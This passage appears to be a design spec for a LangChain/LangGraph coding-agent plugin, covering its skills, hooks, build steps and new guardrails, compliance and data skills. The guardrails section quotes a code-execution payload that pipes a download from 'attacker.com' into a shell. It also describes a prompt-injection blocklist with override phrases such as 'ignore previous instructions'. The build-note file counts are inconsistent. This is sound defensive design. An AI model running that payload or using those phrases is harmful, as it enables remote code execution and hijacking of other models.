3. Call `mcp__plugin_context7_context7__resolve-library-id` (parallel for multi-library)
4. Call `mcp__plugin_context7_context7__query-docs` at 4000 tokens; use fallback broadening table for sparse results
5. Synthesize from doc content only — never from training memory as primary source
6. Append version qualification if user specified a version

**Output format (fixed 6 sections):** What it is, When to use it, How to use it (complete runnable code), Common mistakes table, Related concepts, Source URL.

**Cross-reference protocol:** named table of LangChain/LangGraph concept pairs (tools, memory, streaming, agents, config) instructs the agent on surfacing the relationship and difference when a topic spans both libraries.

**Fallback mode:** when Context7 is unavailable, synthesize from training knowledge but prepend: `> NOTE: Fetched from training memory, not live documentation. Verify against current docs.`

**Pre-delivery quality checklist:** code uses `load_dotenv()`, `claude-sonnet-4-6` as model string, LCEL pipe syntax, no deprecated APIs, fallback notice present when applicable.

---

## Cross-Cutting Concerns

### Default LLM

Every code example across all skills and commands uses:
```python
from langchain_anthropic import ChatAnthropic
llm = ChatAnthropic(model="claude-sonnet-4-6")
```

The model string `claude-sonnet-4-6` is hardcoded in all templates. Skills that discuss cost control note that `claude-haiku-4-5` can be swapped in for testing and evaluation workloads.

### LangSmith

All generated projects include LangSmith configuration by default:
```
LANGSMITH_TRACING=true
LANGSMITH_API_KEY=<your-key>
LANGSMITH_PROJECT=langchain-lab
```

No instrumentation code is needed — setting `LANGSMITH_TRACING=true` before importing LangChain is sufficient. Skills note this explicitly and teach users to verify with the first trace.

### Error Handling Patterns

Every `@tool` function uses `ToolException` (not bare `Exception`). Every `ToolNode` sets `handle_tool_errors=True`. LCEL chains use `.with_retry()` for transient failures and `.with_fallbacks()` for model fallback. LangGraph graphs set `recursion_limit=25` (default is 25 but set explicitly for clarity).

### Python Version Requirements

- Minimum: Python 3.9 (blocked by `lc:start` step 3)
- Recommended: Python 3.11+ (journey skill warns on < 3.11)
- All async code uses `asyncio.run()` or `async def main()` patterns compatible with 3.9+
- Type hint syntax uses `from __future__ import annotations` for forward references where needed

### Package Versions

| Package | Version |
|---|---|
| langchain-core | 0.3.x |
| langchain-anthropic | 0.3.x |
| langgraph | 1.2.x |
| langgraph-supervisor | 0.0.x (latest) |
| langsmith | 0.2.x |
| pydantic | 2.x (v1 syntax never used) |
| python-dotenv | 1.x |
| chromadb | 0.5.x (RAG dev) |
| sentence-transformers | 3.x (RAG dev) |

### State Design Invariants

All LangGraph state TypedDicts follow these rules enforced by `lc-coder` and `lc-reviewer`:
- List fields always use `Annotated[list[T], operator.add]` or `Annotated[list[Message], add_messages]`
- Scalar fields (str, int, bool) are plain TypedDict fields (last-write-wins is correct for scalars)
- State fields are never mutated in place — nodes return new partial dicts
- Every graph that accepts user input has `recursion_limit` set on compile

---

## Hooks

### PostToolUse — Python syntax check

```json
{
  "event": "PostToolUse",
  "matcher": "Write",
  "command": "python -c \"import ast, sys; [ast.parse(open(f).read()) for f in sys.argv[1:] if f.endswith('.py')]\" \"$TOOL_OUTPUT_PATH\" 2>/dev/null || true",
  "description": "Syntax-check .py files written by the plugin. Fails silently (|| true) to avoid blocking on non-Python writes."
}
```

**Why:** Catches syntax errors in generated code before the user tries to run it. Silent failure ensures the hook never blocks writes to `.env`, `pyproject.toml`, or other non-Python files.

---

## Build Notes

### Files the build workflow must create

The build workflow must write ALL of the following files from scratch using the specifications in this document.

**Skills — 13 domain/journey skill files:**
1. `skills/start.md` — lc:start (journey)
2. `skills/design-system.md` — lc:design-system (journey)
3. `skills/graph.md` — lc:graph
4. `skills/context-engineer.md` — lc:context-engineer
5. `skills/lc-agent/SKILL.md` — lc:agent
6. `skills/lc-debug/SKILL.md` — lc:debug
7. `skills/lc-deploy/SKILL.md` — lc:deploy
8. `skills/lc-lcel/SKILL.md` — lc:lcel
9. `skills/lc-memory/SKILL.md` — lc:memory
10. `skills/lc-monitor/SKILL.md` — lc:monitor
11. `skills/lc-test/SKILL.md` — lc:test
12. `skills/lc-tools/SKILL.md` — lc:tools
13. `skills/rag/SKILL.md` — lc:rag

**Commands — 8 command files (some are skill-backed):**
14. `skills/lc-docs/SKILL.md` — /lc-docs command + lc:docs skill
15. `skills/lc-explain/SKILL.md` — /lc-explain
16. `skills/lc-patterns/SKILL.md` — /lc-patterns
17. `skills/lc-scaffold/SKILL.md` — /lc-scaffold
18. `skills/lc-trace/SKILL.md` — /lc-trace
19. `commands/lc-review.md` — /lc-review
20. `commands/lc-upgrade.md` — /lc-upgrade
21. `commands/lc-ab-test.md` — /lc-ab-test
22. `commands/lc-erase.md` — /lc-erase

**Agents — 4 agent files:**
23. `skills/lc-architect/AGENT.md` — lc-architect
24. `skills/lc-coder/AGENT.md` — lc-coder
25. `skills/lc-reviewer/AGENT.md` — lc-reviewer
26. `skills/lc-docs/AGENT.md` — lc-docs-agent

**Plugin manifest:**
27. `plugin.json` — written using the manifest JSON in this spec

**This spec:**
28. `PLUGIN_SPEC.md` — already exists (this document)

**Total: 27 files to create, 1 already exists.** The build workflow must:
1. Write all 25 skill/command/agent markdown files using the detailed specs in this document
2. Write `plugin.json` using the manifest JSON above
3. Register the PostToolUse hook in `settings.local.json`
4. Confirm the directory structure matches the Project Structure section above

### Settings.local.json hook registration

The build workflow should merge the following into `C:/git/langchain/.claude/settings.local.json`:

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "python -c \"import ast, sys; [ast.parse(open(f).read()) for f in sys.argv[1:] if f.endswith('.py')]\" 2>/dev/null || true"
          }
        ]
      }
    ]
  }
}
```

### Validation checklist for build workflow

- [ ] All 24 skill/command/agent `.md` files exist and have content > 500 bytes
- [ ] `plugin.json` is valid JSON matching the manifest in this spec
- [ ] `plugin.json` lists exactly 14 skills, 7 commands, 4 agents
- [ ] All `file` paths in `plugin.json` resolve to existing files
- [ ] No skill description in `plugin.json` summarizes its workflow (SDO rule: starts with "Use when..." or "Full" or active verb describing the output)
- [ ] `settings.local.json` contains the PostToolUse hook
- [ ] `PLUGIN_SPEC.md` is present at `.claude/PLUGIN_SPEC.md`


---

# PLUGIN_SPEC.md "” Additions (Gap Analysis v2)

---

## Updated Plugin Manifest Additions

### New Skills (add these to the skills array in plugin.json):

```json
{
  "name": "lc-guardrails",
  "file": "skills/lc-guardrails/SKILL.md",
  "description": "Safety layers for LangChain apps "” input sanitization, prompt injection defense, PII detection, output validation, cost circuit breakers, and LLM-as-judge moderation.",
  "triggers": ["prompt injection", "input sanitization", "guardrails", "PII", "content moderation", "output validation", "cost circuit breaker", "lc:guardrails"]
},
{
  "name": "lc-providers",
  "file": "skills/lc-providers/SKILL.md",
  "description": "LLM provider configuration "” Anthropic, OpenAI, Azure OpenAI, AWS Bedrock, Google Gemini, Ollama "” with provider factory, fallback chains, and swap patterns.",
  "triggers": ["Azure", "Bedrock", "Gemini", "Ollama", "no API key", "offline", "what if API goes down", "provider", "lc:providers"]
},
{
  "name": "lc-resilience",
  "file": "skills/lc-resilience/SKILL.md",
  "description": "Production reliability patterns "” fallbacks, retries with jitter, circuit breakers, rate limit handling, connection pooling, timeout configuration, and dead letter queues.",
  "triggers": ["retry", "fallback", "circuit breaker", "rate limit", "timeout", "connection pool", "dead letter queue", "reliability", "lc:resilience"]
},
{
  "name": "lc-audit",
  "file": "skills/lc-audit/SKILL.md",
  "description": "Compliance audit logging for LangChain "” immutable PostgreSQL audit tables, cryptographic chain-of-custody, user attribution, retention policies, SOC2/HIPAA/PCI/EU AI Act compliance queries.",
  "triggers": ["audit log", "compliance logging", "HIPAA", "SOC2", "PCI", "tamper-evident", "immutable trace", "LangSmith alternative", "lc:audit"]
},
{
  "name": "lc-compliance",
  "file": "skills/lc-compliance/SKILL.md",
  "description": "Regulatory compliance patterns "” GDPR data minimization, data residency, right to erasure, HIPAA PHI guards, EU AI Act human oversight, data classification, privacy-preserving RAG.",
  "triggers": ["GDPR", "HIPAA", "EU AI Act", "data residency", "right to erasure", "PII", "data classification", "privacy", "lc:compliance"]
},
{
  "name": "lc-data",
  "file": "skills/lc-data/SKILL.md",
  "description": "Data source agents "” text-to-SQL with validation loops, safe SQL tools, Pandas agents, OpenAPI agents, CSV/Excel ingestion, and multi-source agents.",
  "triggers": ["SQL", "database", "text-to-SQL", "pandas", "CSV", "Excel", "OpenAPI", "data agent", "lc:data"]
},
{
  "name": "lc-vectorstore",
  "file": "skills/lc-vectorstore/SKILL.md",
  "description": "Vector store patterns "” provider selection, embedding caching, CRUD lifecycle, multi-tenant namespacing, incremental index updates, migration, health monitoring, hybrid search, pgvector deep dive.",
  "triggers": ["vector store", "embeddings", "Chroma", "Pinecone", "Qdrant", "pgvector", "Weaviate", "FAISS", "hybrid search", "lc:vectorstore"]
},
{
  "name": "lc-multimodal",
  "file": "skills/lc-multimodal/SKILL.md",
  "description": "Multimodal LangChain patterns "” image input, PDF loaders, table extraction, document layout analysis, multimodal RAG, audio/Whisper transcription, multimodal agents, batch processing, content moderation.",
  "triggers": ["image", "PDF", "multimodal", "vision", "audio", "Whisper", "document", "table extraction", "lc:multimodal"]
},
{
  "name": "lc-ui",
  "file": "skills/lc-ui/SKILL.md",
  "description": "User interface patterns for LangChain apps "” Chainlit, Gradio, Streamlit, FastAPI+HTMX with streaming, file upload, authentication, human-in-the-loop UI, and source citation display.",
  "triggers": ["UI", "chat interface", "Chainlit", "Gradio", "Streamlit", "FastAPI", "streaming UI", "frontend", "lc:ui"]
}
```

### New Commands (add these to the commands array in plugin.json):

```json
{
  "name": "lc-guard",
  "file": "commands/lc-guard.md",
  "description": "Audit an existing LangChain project for security gaps and generate a guardrails_layer.py with fixes.",
  "argument-hint": "[path/to/project]"
},
{
  "name": "lc-antipatterns",
  "file": "commands/lc-antipatterns.md",
  "description": "Interactive catalog of 15 LangChain antipatterns with before/after fixes. Supports menu browsing, direct lookup, and file scanning.",
  "argument-hint": "[number|keyword|scan <file>]"
},
{
  "name": "lc-ab-test",
  "file": "commands/lc-ab-test.md",
  "description": "Scaffold an A/B evaluation harness comparing prompts, models, or chains using LangSmith datasets with bootstrap confidence intervals and paired t-tests.",
  "argument-hint": "[--prompt | --model | --chain]"
},
{
  "name": "lc-erase",
  "file": "commands/lc-erase.md",
  "description": "Generate a GDPR Article 17 right-to-erasure implementation "” detects data stores, generates erase_user.py and erasure_audit.sql, enforces 30-day deadline.",
  "argument-hint": "<user_id>"
},
{
  "name": "lc-providers",
  "file": "commands/lc-providers.md",
  "description": "Configure or swap LLM providers "” generates src/providers.py factory, updates .env.example, supports --swap migration between providers.",
  "argument-hint": "[anthropic|openai|azure|bedrock|gemini|ollama|--swap]"
}
```

### New Files (add to Project Structure):

```
.claude/skills/lc-guardrails/SKILL.md
.claude/skills/lc-providers/SKILL.md
.claude/skills/lc-resilience/SKILL.md
.claude/skills/lc-audit/SKILL.md
.claude/skills/lc-compliance/SKILL.md
.claude/skills/lc-data/SKILL.md
.claude/skills/lc-vectorstore/SKILL.md
.claude/skills/lc-multimodal/SKILL.md
.claude/skills/lc-ui/SKILL.md
.claude/commands/lc-guard.md
.claude/commands/lc-antipatterns.md
.claude/commands/lc-ab-test.md
.claude/commands/lc-erase.md
.claude/commands/lc-providers.md
```

---

## New Skills (Full Specs)

### Skill: lc-guardrails

**File:** `.claude/skills/lc-guardrails/SKILL.md`

**Description:** Safety layers for LangChain/LangGraph applications covering the full threat surface: prompt injection, indirect injection via tool results, PII leakage, unbounded cost, missing timeouts, unsandboxed code execution, and output manipulation.

**Trigger conditions:** Any of "” "prompt injection", "guardrails", "input sanitization", "PII detection", "content moderation", "output validation", "cost circuit breaker", "NeMo Guardrails", "LLM judge", `/lc-guardrails`

**Discovery flow (4 questions, asked together in one message):**

```
Before scaffolding, I need four answers:

1. What is your deployment context?
   A) Local dev / demo "” minimal overhead acceptable
   B) Internal tool / low-stakes production
   C) Customer-facing production
   D) Regulated industry (healthcare, finance, legal)

2. What is your primary threat concern?
   A) Prompt injection / jailbreak attempts
   B) PII leakage in outputs
   C) Unbounded cost / runaway spend
   D) Unsafe tool execution (code, file system, network)
   E) All of the above

3. Do you already use LangSmith tracing?
   A) Yes "” LANGSMITH_TRACING=true is set
   B) No

4. Do you have an existing LangGraph graph to protect, or are you building new?
   A) Existing graph "” I will show you surgical insertion points
   B) Building new "” scaffold the full guarded structure
```

**Routing matrix:** Answers gate which of 7 patterns are generated. D+E (regulated, all threats) generates all 7. A+A (local dev, injection only) generates Pattern 1 only.

**Threat education (before any code):**

Each threat is presented as: what the attacker sends â†’ what happens without the guardrail â†’ what happens with it. PII leakage includes the HIPAA/GDPR violation cost anchor ($10,000"“$50,000 per record). Code execution without sandbox is presented as: attacker sends `__import__('os').system('curl attacker.com | sh')` â†’ RCE â†’ sandboxed execution blocks it.

**Seven patterns:**

**Pattern 1 "” Input Sanitization Node**
- 3-layer defense: length check (truncate at `MAX_INPUT_CHARS`), regex blocklist (compiled at module level, covers `ignore previous instructions`, `system:`, `<|im_start|>` and 12 other injection strings), LLM-as-judge stub (calls `claude-haiku-4-5` with a binary `SAFE/UNSAFE` structured output schema)
- `sanitize_input_node(state, config)` returns `{"messages": state["messages"]}` (pass-through) or raises `InputRejectedError`
- `InputRejectedError` is a custom exception (not a return value) so it surfaces in LangSmith as an error event, enabling audit queries on rejection rate

**Pattern 2 "” Tool Output Sanitization**
- `ToolOutputSanitizer` strips instruction-like patterns from `ToolMessage.content` before it is appended to the message list
- `make_safe_tool_node(tools)` wraps `ToolNode(tools, handle_tool_errors=True)` and pipes every `ToolMessage` through the sanitizer
- Inline explanation of why `handle_tool_errors=True` is non-optional: without it, a tool exception crashes the graph and exposes the traceback to the LLM

**Pattern 3 "” PII Detection and Redaction**
- `PIIGuard` using `presidio-analyzer` + `presidio-anonymizer`
- Two modes: `REDACT` (replace with `[REDACTED_EMAIL]` etc.) and `REJECT` (raise `PIIRejectedError` for SSN and credit card numbers)
- `redact_output_node` runs on the output side before returning to the user
- Dollar cost of HIPAA violations anchored in comments

**Pattern 4 "” Cost Circuit Breaker**
- `CostCircuitBreaker(BaseCallbackHandler)` with `on_llm_end` (sync) and `on_llm_end_async`
- Anthropic pricing table embedded as `COST_PER_1K_TOKENS` dict
- Per-tenant daily budget stored in Redis: `cost:{tenant_id}:{YYYY-MM-DD}` with `INCRBYFLOAT` and 48-hour TTL
- `asyncio.Lock` guards the read-increment-check sequence to prevent race conditions on concurrent requests
- `on_llm_start` reads the counter and raises `BudgetExceededError` before the API call (fail-fast, no wasted spend)

**Pattern 5 "” Human-in-the-Loop for Destructive Tools**
- `interrupt()` called inside the tool-routing node when the selected tool is in `DESTRUCTIVE_TOOLS` set
- Post-interrupt: `Command(resume=decision)` where decision is `"approve"` or `"reject"`
- Inline explanation of what `interrupt()` actually does: serializes graph state to checkpointer, surfaces the `__interrupt__` value to the caller, waits for `.invoke(Command(resume=...))` "” it does not pause a thread, it ends the current invocation
- `AsyncPostgresSaver` required (MemorySaver cannot survive the interrupt boundary in production)

**Pattern 6 "” NeMo Guardrails Integration**
- Side-by-side comparison table: manual (Patterns 1-3) vs NeMo (declarative Colang policies)
- When to use NeMo: regulated industries with compliance teams who need to own policy files without touching Python
- Complete `config/` directory scaffold: `config.yml`, `rails/input.co`, `rails/output.co`
- `LangchainEmbeddingsConnector` wiring

**Pattern 7 "” Complete Guarded Graph Scaffold**
- ASCII diagram of the full graph before the code: `sanitize_input â†’ agent â†’ safe_tool_node â†’ redact_output`
- `GuardedState(TypedDict)` with all fields
- All 6 patterns wired together
- `.env.example` additions

**Concepts taught:** prompt injection mechanics, indirect injection, `InputRejectedError` vs return value for auditability, `asyncio.Lock` for concurrent budget tracking, `interrupt()` serialization semantics, NeMo Colang policy syntax

**Transitions:** "For compliance logging of all guardrail events â†’ lc:audit. For rate limiting and retry after BudgetExceededError â†’ lc:resilience. For scanning an existing project for guardrail gaps â†’ /lc-guard."

---

### Skill: lc-providers

**File:** `.claude/skills/lc-providers/SKILL.md`

**Description:** Complete provider configuration for all major LangChain LLM providers with a provider-agnostic factory, fallback chains, and swap patterns.

**Trigger conditions:** Any of "” "Azure", "Bedrock", "Gemini", "Ollama", "no API key", "offline LLM", "what if API goes down", "switch providers", "provider factory", `/lc-providers`

**Discovery flow (3 questions):**

```
1. Which providers do you need?
   A) Anthropic (Claude) only
   B) OpenAI only
   C) Multiple providers / fallback chain
   D) Azure OpenAI or AWS Bedrock (enterprise)
   E) Ollama (local, no API key)

2. Do you need embeddings as well as chat?
   A) Chat only
   B) Chat + embeddings

3. Is this a new project or adding to an existing one?
   A) New "” generate full src/providers.py
   B) Existing "” show me the diff only
```

**Eight patterns:**

**Pattern 1 "” Anthropic:** Dated model IDs only (never floating aliases). `max_tokens` is required. Extended thinking example. Rate limit retry with `anthropic.RateLimitError`.

**Pattern 2 "” OpenAI:** `gpt-4o`/`o1`/`o3` selection guide. `temperature=1` required for o-series (the factory sets this automatically by checking `model.startswith("o")`). `text-embedding-3-small` for embeddings.

**Pattern 3 "” Azure OpenAI:** `azure_deployment=` not `model=` (most common mistake, called out in a warning block). Deployment names read from env vars per tier.

**Pattern 4 "” AWS Bedrock:** Always `ChatBedrockConverse`, never legacy `ChatBedrock`. Three auth options: access keys, instance profile, AWS SSO. Cross-region inference profile IDs. One-time model enablement step in AWS console.

**Pattern 5 "” Ollama:** `ollama pull` commands per tier. Streaming emphasized (local models are slow; streaming feels faster). `OllamaEmbeddings` for fully local RAG. GPU memory note.

**Pattern 6 "” Provider factory (`src/providers.py`):** `get_llm(tier="standard", provider=None)` reads `LLM_PROVIDER` env var. `PROVIDER_MODELS` dict maps `fast/standard/powerful` tiers to pinned model IDs per provider. `get_embeddings()` factory. o1 temperature edge case handled automatically.

**Pattern 7 "” Fallback chain:** `.with_fallbacks(exceptions_to_handle=(Exception,))`. Three-tier cost-optimized chain (haiku â†’ sonnet â†’ gpt-4o). OpenRouter meta-provider option.

**Pattern 8 "” Tests (`tests/test_provider_factory.py`):** `@pytest.mark.skipif` decorators for missing credentials. Interface consistency tests (streaming, `bind_tools`, structured output). Fallback simulation via monkeypatch.

**Concepts taught:** Why `load_dotenv()` must come before any LangChain import, `ChatBedrockConverse` vs `ChatBedrock`, ADC (Application Default Credentials) for Vertex AI, o1 temperature constraint, why pinned model IDs matter (floating aliases silently change behavior)

**Transitions:** "For adding these providers to a full project scaffold â†’ /lc-providers command. For testing provider behavior â†’ lc:test. For resilience when a provider is down â†’ lc:resilience."

---

### Skill: lc-resilience

**File:** `.claude/skills/lc-resilience/SKILL.md`

**Description:** Production reliability patterns for LangChain/LangGraph "” connection pooling, timeout configuration, retry with jitter, circuit breakers, rate limit handling, fallback chains, and dead letter queues.

**Trigger conditions:** Any of "” "retry", "fallback", "circuit breaker", "rate limit", "timeout", "connection pool", "dead letter queue", "flaky", "unreliable", "production", `/lc-resilience`

**Discovery flow (3 questions):**

```
1. What is your primary reliability concern?
   A) LLM API rate limits / 429 errors
   B) Network timeouts / slow responses
   C) Database connection exhaustion
   D) Cascading failures under load
   E) All of the above

2. What is your expected traffic pattern?
   A) Low volume (< 10 req/min) "” simple retries sufficient
   B) Medium volume (10-100 req/min) "” connection pooling + circuit breaker
   C) High volume (> 100 req/min) "” full production stack

3. Are you using async (ainvoke) or sync (invoke)?
   A) Async throughout
   B) Sync
   C) Mixed
```

**Eight patterns:**

**Pattern 1 "” Retry with exponential backoff and jitter:** `tenacity` `@retry` decorator. Catches `anthropic.RateLimitError`, `openai.RateLimitError`, `httpx.TimeoutException`. `wait_exponential_jitter` prevents thundering herd. `retry_if_exception_type` with a union of provider exceptions. Inline explanation of why jitter is necessary (all clients retrying simultaneously makes the problem worse).

**Pattern 2 "” httpx timeout configuration:** `httpx.Timeout` with all four components named: `connect`, `read`, `write`, `pool`. Explains that "timeout" is not one value "” a missing `read` timeout with a set `connect` timeout leaves you exposed to slow-response attacks. Passed to provider via `http_client=` parameter.

**Pattern 3 "” asyncpg connection pool:** `asyncpg.create_pool` singleton with `min_size`, `max_size`, `max_inactive_connection_lifetime`. `log_pool_stats` background task (runs every 60s, logs `pool.get_size()`, `pool.get_idle_size()`). Teaches that pools must be shared at process level, not created per-request.

**Pattern 4 "” Circuit breaker:** `coro_factory` lambda pattern (explains why a factory not a coroutine "” the circuit breaker needs to re-call the function, not re-await a spent coroutine). Three states: CLOSED, OPEN, HALF_OPEN. Fallback to cached response or simplified model.

**Pattern 5 "” LangGraph retry budget node:** `Annotated[int, operator.add]` for retry counter in state (explains LangGraph state merge semantics inline). `MAX_RETRIES=3` guard with conditional edge to `handle_error` node.

**Pattern 6 "” Rate limit token bucket:** `asyncio.Semaphore` for concurrent request cap. Token bucket implementation for rate smoothing. Per-tenant rate limiting with Redis.

**Pattern 7 "” Fallback chain with cost tiers:** `.with_fallbacks()` three-tier chain. `RateLimitError` specifically routes to cheaper model, not just any exception. Provider-level fallback (Anthropic â†’ OpenAI) for provider outage.

**Pattern 8 "” Dead letter queue:** `SELECT FOR UPDATE SKIP LOCKED` PostgreSQL pattern for job queue (explains this is the canonical PostgreSQL job queue pattern "” avoids locks, allows multiple workers). DLQ worker with retry count, backoff, and poison pill detection.

**Production checklist:** Generated as `production-checklist.md` with values filled from discovery answers.

**Concepts taught:** Thundering herd, jitter, why `httpx.Timeout` has four components, connection pool sizing, circuit breaker state machine, `operator.add` in LangGraph state, `SELECT FOR UPDATE SKIP LOCKED`

**Transitions:** "For deploying this reliably â†’ lc:deploy. For monitoring retry rates and circuit breaker trips â†’ lc:monitor. For testing resilience â†’ lc:test."

---

### Skill: lc-audit

**File:** `.claude/skills/lc-audit/SKILL.md`

**Description:** Compliance audit logging for LangChain "” immutable PostgreSQL audit tables, cryptographic hash chains, user attribution, retention/archival, and compliance query views for SOC2/HIPAA/PCI DSS/EU AI Act.

**Trigger conditions:** Any of "” "audit log", "compliance logging", "HIPAA audit", "SOC2", "PCI DSS", "tamper-evident", "immutable trace", "self-hosted LangSmith alternative", "GDPR logging", `/lc-audit`

**Teaching section (before any code):** Five reasons LangSmith is not a compliance audit log: mutability (runs can be deleted), storage control (data on LangChain Inc. servers), no cryptographic integrity, optional user attribution, coarse retention. Then defines the 8 properties a real compliance audit log must provide. Then shows the full architecture diagram.

**Discovery flow (3 questions):**

```
1. Which compliance framework applies?
   A) SOC 2 Type II
   B) HIPAA
   C) PCI DSS
   D) EU AI Act
   E) GDPR only
   F) Internal audit / no specific framework

2. Do you need per-request user attribution?
   A) Yes "” every LLM call must be tied to an authenticated user ID
   B) No "” system-level tracing is sufficient

3. What is your retention requirement?
   A) 90 days
   B) 1 year
   C) 7 years (SOC2 / PCI)
   D) Indefinite
```

**Eight patterns:**

**Pattern 1 "” PostgreSQL audit table DDL:** Partitioned `audit.llm_calls` table. `audit_app_role` with explicit `REVOKE DELETE`, `REVOKE UPDATE`, `REVOKE TRUNCATE`. Separate `audit_reader_role`. Partition by month. Row-level TTL via pg_cron.

**Pattern 2 "” ImmutableAuditCallback:** `AsyncCallbackHandler` subclass. `on_llm_start`, `on_llm_end`, `on_tool_start`, `on_tool_end`, `on_tool_error`. Fire-and-forget asyncpg inserts (never blocks main thread). `session_id` from `config["configurable"]["user_id"]`.

**Pattern 3 "” Cryptographic hash chain:** `AuditChainVerifier` with `_compute_row_hash()` (SHA-256 of `row_id + prev_hash + content + timestamp`). `verify_chain()` walks the full table in order. `insert_with_chain()` uses serializable transaction to prevent concurrent inserts breaking the chain.

**Pattern 4 "” FastAPI integration:** `get_current_user` JWT dependency. Per-request `ImmutableAuditCallback` instantiation with `user_id` injected.

**Pattern 5 "” Decision rationale capture:** `DecisionRationale` Pydantic model. LCEL rationale chain. `routing_node_with_rationale` graph node stores the LLM's reasoning in the audit record. Required for EU AI Act Article 13 (transparency).

**Pattern 6 "” Compliance query views:** Seven SQL views covering user activity, high-cost calls, failed tools, daily summaries, SOC2 CC6.1, HIPAA accounting of disclosures, GDPR Article 15, EU AI Act rationale audit, PCI DSS Req 10.

**Pattern 7 "” Retention and archival:** `create_next_month_partition()`, `delete_before()`, `archive_partition_before_delete()` PostgreSQL functions. pg_cron schedules. Python archival worker using `pg_notify` to trigger S3 export before deletion.

**Pattern 8 "” Self-hosted alternatives:** Langfuse Docker Compose. Phoenix air-gapped setup. OpenTelemetry OTLP collector config. Comparison table: LangSmith vs Langfuse vs Phoenix vs OTLP (8 dimensions).

**Compliance checklists:** Separate checklists for SOC2 Type II, HIPAA, PCI DSS, EU AI Act.

**Concepts taught:** Why INSERT-only tables require explicit REVOKE, hash chain construction, serializable transactions, pg_cron, partition pruning, `pg_notify`

**Transitions:** "For GDPR right-to-erasure (deleting a user's audit records correctly) â†’ lc:compliance Pattern 3 or /lc-erase. For self-hosted observability â†’ lc:monitor Section 10."

---

### Skill: lc-compliance

**File:** `.claude/skills/lc-compliance/SKILL.md`

**Description:** Regulatory compliance patterns for LangChain/LangGraph "” GDPR data minimization and erasure, HIPAA PHI guards, EU AI Act human oversight, data residency, data classification, and privacy-preserving RAG.

**Trigger conditions:** Any of "” "GDPR", "HIPAA", "EU AI Act", "data residency", "right to erasure", "PII", "data classification", "privacy", "compliance", `/lc-compliance`

**Legal disclaimer (displayed first, before any code):** "This skill generates technical implementation patterns. It does not constitute legal advice. Have your implementation reviewed by qualified legal counsel before handling regulated data in production."

**Teaching section:** What each regulation technically requires, mapped to LangChain/LangGraph patterns. GDPR Article 5 data minimization â†’ strip PII before LLM call. GDPR Article 17 erasure â†’ delete from checkpointer + vector store + traces. HIPAA minimum necessary â†’ PHI guard node. EU AI Act Article 14 human oversight â†’ `interrupt()` before consequential decisions.

**Discovery flow (4 questions):**

```
1. Which regulation applies to your project?
   A) GDPR (EU personal data)
   B) HIPAA (US health data)
   C) EU AI Act (high-risk AI system)
   D) Multiple / unsure "” show me all patterns

2. What personal data does your LLM process?
   A) Names, emails, addresses (standard PII)
   B) Health/medical data
   C) Financial data (account numbers, card numbers)
   D) None "” no personal data

3. Where will your application be deployed?
   A) EU / EEA "” GDPR applies by default
   B) US "” HIPAA / state laws may apply
   C) Global "” need multi-jurisdiction approach

4. Does your application make consequential decisions?
   (loan approval, medical triage, content moderation at scale)
   A) Yes "” EU AI Act Article 14 human oversight required
   B) No
```

**Seven patterns:**

**Pattern 1 "” GDPR Data Minimization Node:** Presidio `AnalyzerEngine` + `AnonymizerEngine` at graph entry. Strips PII before LLM call. Configurable entity types per deployment context.

**Pattern 2 "” Data Residency:** Three ranked options: env vars for provider selection (quickest), `PIIMaskingCallbackHandler` (middle ground), Langfuse Docker Compose on EU infrastructure (strongest). `LLM_REGION` env var drives provider selection.

**Pattern 3 "” Data Subject Rights:** Complete `delete_user_data()` covering checkpointer + vector store + LangSmith + audit log. `get_user_data()` for Article 15 access requests. `export_user_data()` for portability. All three return structured receipts with record counts.

**Pattern 4 "” HIPAA PHI Guard:** Presidio medical recognizer additions (`US_HEALTHCARE_NPI`, `MEDICAL_LICENSE`). BLOCK vs MASK routing modes. `route_after_phi_guard` conditional edge.

**Pattern 5 "” EU AI Act Human Oversight:** `interrupt()` + `Command(resume=...)` pattern for mandatory human review before consequential decisions. `HumanOversightState` with `decision_rationale` field for Article 13 transparency logging.

**Pattern 6 "” Data Classification Node:** Two-stage: regex rules first (cost-efficient), LLM fallback for ambiguous cases. Routes to encrypted processing path vs standard path based on sensitivity tier.

**Pattern 7 "” Privacy-Preserving RAG:** PII stripped at ingest. Per-user namespace isolation via vector store filter. Retrieval audit logging. Source citations for data lineage. Local HuggingFace embeddings to avoid external API data transfer.

**Concept index:** Maps every introduced term to its first appearance in the skill.

**Transitions:** "For compliance audit logging â†’ lc:audit. For generating a right-to-erasure implementation â†’ /lc-erase. For self-hosted observability that keeps data on-premises â†’ lc:monitor Section 10."

---

### Skill: lc-data

**File:** `.claude/skills/lc-data/SKILL.md`

**Description:** Data source agents for LangChain "” text-to-SQL with validation loops, safe SQL tools, Pandas DataFrame agents, OpenAPI agents, CSV/Excel ingestion, and multi-source agents.

**Trigger conditions:** Any of "” "SQL", "database query", "text-to-SQL", "pandas", "CSV", "Excel spreadsheet", "OpenAPI", "REST API agent", "data agent", `/lc-data`

**Discovery flow (3 questions):**

```
1. What is your data source?
   A) SQL database (PostgreSQL, MySQL, SQLite)
   B) Pandas DataFrame / CSV / Excel
   C) REST API with OpenAPI spec
   D) Multiple sources "” I need an agent that can query all of them

2. Do you need write access?
   âš ï¸  IMPORTANT: Write access means the LLM can INSERT, UPDATE, DELETE data.
   A) Read-only "” SELECT queries only (strongly recommended to start)
   B) Read-write "” I understand the LLM may modify data

3. How will this be used?
   A) Interactive "” user asks questions, gets answers
   B) Automated "” part of a pipeline, no human in the loop
```

**Six patterns:**

**Pattern 1 "” Text-to-SQL with Validation Loop:** `SQLAgentState(TypedDict)` with `query`, `sql`, `result`, `error`, `retry_count`. Five nodes: `generate_sql â†’ validate_sql â†’ execute_sql â†’ summarize_result`, plus `handle_error`. Conditional edges for retry loop. `MAX_RETRIES=3` guard with `recursion_limit=20`. `validate_sql` uses `sqlglot.parse()` AST analysis "” inline explanation of why string matching is insufficient (regex cannot parse nested quotes, comments, or multi-statement attacks). Auto-injects `LIMIT 100` via AST rewrite.

**Pattern 2 "” Safe SQL Tool:** `@tool` for ReAct agents. Same AST validation. `LIMIT 100` AST rewrite. Sensitive column masking. Result truncation. Raises `ToolException` so agent handles failures gracefully.

**Pattern 3 "” Pandas Agent:** `create_pandas_dataframe_agent` with `allow_dangerous_code=True` thoroughly explained (what it enables, what the risks are). E2B sandboxed alternative for production. Excel multi-sheet variant.

**Pattern 4 "” OpenAPI Agent:** `reduce_openapi_spec` for large specs. `RequestsWrapper` with auth header injection from env vars. Reusable exponential backoff decorator.

**Pattern 5 "” CSV Ingestion:** Column-as-metadata promotion pattern. Schema validation before loading. Excel multi-sheet handling.

